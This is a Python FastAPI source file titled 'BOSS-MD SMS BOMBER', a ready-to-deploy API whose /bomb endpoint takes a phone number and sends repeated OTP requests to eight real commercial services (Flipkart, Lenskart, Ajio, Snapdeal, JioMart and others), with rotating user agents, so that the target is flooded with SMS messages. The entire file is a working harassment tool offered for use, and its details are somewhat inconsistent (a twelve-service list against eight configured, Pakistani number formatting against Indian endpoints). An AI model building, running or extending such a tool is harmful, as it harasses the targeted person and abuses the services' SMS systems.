from fastapi import FastAPI, Query
from typing import Optional
import requests
import json
import random
import time
import os

app = FastAPI(
    title="BOSS-MD SMS BOMBER",
    description="Ultimate SMS Bomber API",
    version="3.0"
)

# User agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
]

@app.get("/")
def home():
    return {
        "status": "ACTIVE",
        "name": "BOSS-MD SMS BOMBER",
        "version": "3.0",
        "platform": "Vercel",
        "endpoints": {
            "/bomb": "GET - ?number=923001234567&count=10",
            "/status": "GET - Check API status",
            "/services": "GET - List all services"
        }
    }

@app.get("/services")
def services():
    """List all bombing services"""
    return {
        "total": 12,
        "services": [
            "Flipkart", "ConfirmTKT", "Lenskart", "JustDial",
            "IndiALends", "Apollo Pharmacy", "MagicBricks", "Ajio",
            "MylesCars", "Unacademy", "Snapdeal", "JioMart"
        ]
    }

@app.get("/status")
def status():
    """API health check"""
    return {
        "status": "operational",
        "uptime": "100%",
        "response_time": "<100ms"
    }

@app.get("/bomb")
def bomb(
    number: str = Query(..., description="Phone number (e.g., 923001234567)"),
    count: Optional[int] = Query(10, description="Number of messages (max 20)")
):
    try:
        # Validate number
        clean_number = ''.join(filter(str.isdigit, number))
        if len(clean_number) < 10:
            return {
                "success": False,
                "error": "Invalid number",
                "message": "Number must be at least 10 digits"
            }
        
        # Format for Pakistan
        if len(clean_number) == 10:
            formatted = "92" + clean_number
        elif len(clean_number) == 11 and clean_number.startswith('0'):
            formatted = "92" + clean_number[1:]
        else:
            formatted = clean_number
        
        # Limit count for Vercel (20 is safe)
        msg_count = min(count, 20)
        
        # Services configuration
        services = [
            {
                "name": "Flipkart",
                "url": "https://rome.api.flipkart.com/api/7/user/otp/generate",
                "method": "POST",
                "data": {"loginId": f"+91{clean_number[-10:]}"},
                "headers": {
                    "Content-Type": "application/json",
                    "User-Agent": random.choice(USER_AGENTS)
                }
            },
            {
                "name": "ConfirmTKT",
                "url": f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={clean_number[-10:]}&newOtp=true",
                "method": "GET",
                "headers": {
                    "User-Agent": random.choice(USER_AGENTS)
                }
            },
            {
                "name": "Lenskart",
                "url": "https://api.lenskart.com/v2/customers/sendOtp",
                "method": "POST",
                "data": {"telephone": clean_number[-10:]},
                "headers": {
                    "Content-Type": "application/json",
                    "User-Agent": random.choice(USER_AGENTS)
                }
            },
            {
                "name": "JustDial",
                "url": "https://www.justdial.com/functions/whatsappverification.php",
                "method": "POST",
                "data": {"mob": clean_number[-10:], "vcode": "", "rsend": "0"},
                "headers": {
                    "User-Agent": random.choice(USER_AGENTS)
                }
            },
            {
                "name": "Apollo Pharmacy",
                "url": "https://www.apollopharmacy.in/sociallogin/mobile/sendotp",
                "method": "POST",
                "data": {"mobile": clean_number[-10:]},
                "headers": {
                    "User-Agent": random.choice(USER_AGENTS)
                }
            },
            {
                "name": "Ajio",
                "url": "https://login.web.ajio.com/api/auth/generateLoginOTP",
                "method": "POST",
                "data": {"mobileNumber": clean_number[-10:]},
                "headers": {
                    "Content-Type": "application/json",
                    "User-Agent": random.choice(USER_AGENTS)
                }
            },
            {
                "name": "Snapdeal",
                "url": "https://www.snapdeal.com/sendOTP",
                "method": "POST",
                "data": {
                    "emailId": "",
                    "mobileNumber": clean_number[-10:],
                    "purpose": "LOGIN_WITH_MOBILE_OTP"
                },
                "headers": {
                    "User-Agent": random.choice(USER_AGENTS)
                }
            },
            {
                "name": "JioMart",
                "url": f"https://www.jiomart.com/mst/rest/v1/id/details/{clean_number[-10:]}",
                "method": "GET",
                "headers": {
                    "User-Agent": random.choice(USER_AGENTS)
                }
            }
        ]
        
        # Start bombing
        results = []
        sent = 0
        failed = 0
        
        for i in range(msg_count):
            for service in services:
                try:
                    if service["method"] == "POST":
                        if "json" in service["headers"].get("Content-Type", ""):
                            response = requests.post(
                                service["url"],
                                json=service["data"],
                                headers=service["headers"],
                                timeout=3
                            )
                        else:
                            response = requests.post(
                                service["url"],
                                data=service["data"],
                                headers=service["headers"],
                                timeout=3
                            )
                    else:
                        response = requests.get(
                            service["url"],
                            headers=service["headers"],
                            timeout=3
                        )
                    
                    if response.status_code in [200, 201, 202, 400]:
                        sent += 1
                        results.append({
                            "service": service["name"],
                            "status": "success",
                            "code": response.status_code
                        })
                    else:
                        failed += 1
                        
                except Exception as e:
                    failed += 1
                    continue
                
                time.sleep(0.1)  # Small delay
        
        return {
            "success": True,
            "target": f"+{formatted}",
            "total_sent": sent,
            "total_failed": failed,
            "success_rate": f"{round((sent/(sent+failed))*100)}%" if (sent+failed) > 0 else "0%",
            "results": results[:10]  # First 10 results
        }
        
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "message": "Bombing failed"
        }
